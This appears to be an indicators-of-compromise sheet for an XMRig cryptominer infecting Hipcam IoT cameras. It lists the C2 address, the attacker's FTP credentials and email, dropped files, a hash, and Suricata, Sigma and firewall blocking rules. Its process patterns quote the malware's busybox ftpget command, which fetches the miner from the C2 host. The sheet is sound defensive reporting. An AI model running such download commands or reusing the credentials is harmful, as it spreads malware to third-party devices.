# Indicators of Compromise (IOCs)

## Network IOCs

### C2 Server
```
IP:           86.38.203.214
ASN:          AS48031 (XSERVER, Latvia)
HTTP:         GET /omm HTTP/1.0 (port 80)
FTP:          port 21, user=pwn, pass=XAUob5EHu7M54iyD
```

### Block Rules
```sh
# iptables (if camera supports it):
iptables -A OUTPUT -d 86.38.203.214 -j DROP

# Network firewall:
deny outbound to 86.38.203.214 on ports 80, 21
```

## Host IOCs

### Files
```
/etc/init.d/S98test       World-writable init script (10KB+)
/tmp/dl                   ARM ELF HTTP downloader (~1924 bytes)
/tmp/r                    Runner shell script (~400 bytes)
/bin/omm                  XMRig miner (~2.1MB, when downloaded)
```

### SHA256 Hashes
```
/tmp/dl:      3d79e0b6aedec5c5dc0ea5553f1a92d07e0d2d2ff46108581a39228cf5a8e253
              (from camera: sha256sum /tmp/dl)
```

### YARA Rule
See MALWARE_ANALYSIS.md for the complete YARA rule.

## Process IOCs

```sh
# Look for these process patterns:
/bin/omm -device-name=hi_* -email=hwansna@gmail.com
/bin/busybox ftpget -u pwn -p XAUob5EHu7M54iyD 86.38.203.214
/tmp/r   (infinite bash loop, sleep 4)
/tmp/dl  (runs, downloads /omm, then exits)
```

## Behavioral IOCs

- Outbound HTTP GET to `86.38.203.214/omm`
- Outbound FTP connection to `86.38.203.214:21` with credentials `pwn`
- `sleep 4` bash loop monitoring file size
- World-writable file in `/etc/init.d/`
- Hex-encoded data in shell scripts (`echo -ne '\x7F\x45\x4C\x46...'`)

## Attacker Attribution IOCs

```
Email:           hwansna@gmail.com
Mining pool ID:  Y_rLkZXgn3BQ02lRFV6E5
FTP username:    pwn
FTP password:    XAUob5EHu7M54iyD
```

## Kernel Module IOCs

The Goke GK7102 SoC has a hardware crypto accelerator. These kernel modules / device nodes are present on factory firmware:

```
hw_crypto.ko    Goke hardware crypto driver (AES/DES/SHA1)
encipher.ko     Encryption wrapper (depends on hw_crypto.ko)
encript.ko      User-space crypto device (depends on encipher.ko)
gkio.ko         Goke GPIO/IO controller
```

Device node: `/dev/encript` (major 244, minor 0)

## Toolchain Fingerprints

```
Compiler:    GCC 4.9.4
Build sys:   Buildroot 2017.05
Target CPU:  ARM926EJ-S (ARMv5TEJ - dropper compiled for different CPU; actual SoC: Goke GK7102 ARM1176JZF-S)
Kernel:      Linux 3.4.43-gk armv6l ("gk" = Goke, not "global kernel")
libc:        uClibc (static, no runtime dependency)
```

## Recommended Blocking

### DNS Sinkhole
```
zone "203.38.86.in-addr.arpa" { type master; file "null.zone"; };
```

### Suricata/Snort Rule
```
alert tcp $HOME_NET any -> 86.38.203.214 80 (
    msg:"Hipcam IoT XMRig C2 - HTTP Download";
    content:"GET /omm HTTP/1.0";
    content:"HOST: 86.38.203.214";
    sid:1000001;
)
```

### Sigma Rule (for SIEM)
```yaml
title: Hipcam IoT XMRig Miner
description: Detects XMRig cryptominer on Hipcam cameras
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '/bin/omm'
        CommandLine|contains:
            - '-accept-tos'
            - '-email=hwansna@gmail.com'
            - '-password=Y_rLkZXgn3BQ02lRFV6E5'
    condition: selection
level: critical
```
